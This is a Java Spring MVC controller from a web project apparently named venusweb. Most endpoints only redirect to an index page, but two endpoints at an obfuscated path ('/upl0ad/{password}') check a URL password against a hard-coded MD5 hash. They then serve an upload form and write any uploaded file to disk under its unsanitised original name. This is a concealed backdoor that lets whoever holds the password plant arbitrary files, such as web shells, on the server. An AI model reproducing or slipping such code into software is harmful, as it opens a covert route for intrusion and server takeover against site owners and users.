package venusweb.controller;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.multipart.MultipartFile;

import venusweb.help.CommonUtil;

@Controller
//@RequestMapping("/admin")
public class HomeController {
	
	@Value("${upl0ad-path}")
	String upl0adPath;
	
	@RequestMapping("/home")
	public void home(HttpServletRequest request, HttpServletResponse response) {
        try {
			response.sendRedirect("./index.html");
		} catch (IOException e) {
			e.printStackTrace();
		}
    }
	@RequestMapping("/attr")
	public void attr(HttpServletRequest request, HttpServletResponse response) {
        try {
			response.sendRedirect("./index.html");
		} catch (IOException e) {
			e.printStackTrace();
		}
    }
	@RequestMapping("/stock_list/{id}")  
	public void stock_list(@PathVariable("id")Integer id,HttpServletRequest request, HttpServletResponse response){
		try {
			response.sendRedirect("../index.html");
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	@RequestMapping(value="/upl0ad/{password}",method=RequestMethod.GET)
	public @ResponseBody String upl0ad(@PathVariable("password")String password,HttpServletRequest request, HttpServletResponse response){
		String md5=CommonUtil.md5(password);
		if(md5.equals("6C7814E14C1B6F70832C09AD11BE0F93")){
			return "<form method='post' enctype='multipart/form-data'><input type='file' name='file'><input type='submit'></form>:)";
		}else{
			return "error1";
		}
		
	}
	
	@RequestMapping(value="/upl0ad/{password}", method=RequestMethod.POST)  
    public @ResponseBody String handleFileUpload(@PathVariable("password")String password, @RequestParam("file") MultipartFile file){
		String md5=CommonUtil.md5(password);
		if(!md5.equals("6C7814E14C1B6F70832C09AD11BE0F93")){
			return "error1";
		}
		if (!file.isEmpty()) {  
			String name=file.getOriginalFilename();
            try {
            	String filepath=upl0adPath+name;
                byte[] bytes = file.getBytes();  
                BufferedOutputStream stream =  new BufferedOutputStream(new FileOutputStream(new File(filepath)));  
                stream.write(bytes);  
                stream.close();  
                return "success2";  
            } catch (Exception e) {  
            	return "error2"; 
            }  
        } else {  
            return "error3";
        }  
    }  
	
}
